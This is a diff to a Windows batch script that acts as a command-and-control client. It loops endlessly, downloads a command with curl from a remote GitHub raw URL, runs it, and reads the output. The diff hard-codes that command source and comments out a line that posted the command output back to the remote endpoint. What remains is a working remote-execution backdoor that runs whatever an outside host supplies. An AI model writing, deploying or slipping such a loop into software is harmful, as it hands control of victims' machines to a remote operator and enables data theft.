@@ -1,10 +1,10 @@
 @echo off
 
 setlocal enabledelayedexpansion
-set apilink=
+set apilink=https://raw.githubusercontent.com/baum1810/test/main/command.txt
 :CHECK_CMD_CHANGE
 
-curl -o %temp%\cmd.txt %apilink%/getcmd
+curl -o %temp%\cmd.txt %apilink%
 
 set /p new_cmd=<%temp%\cmd.txt
 del %temp%\cmd.txt
@@ -19,7 +19,8 @@ set "cmd=%new_cmd%"
 
 set /p output=<%temp%\output.txt
 
-curl -X POST -d "output=!output!" %apilink%/setoutput
+::curl -X POST -d "output=!output!" %apilink%/setoutput
+echo %output%
 del %temp%\output.txt
 goto CHECK_CMD_CHANGE
 
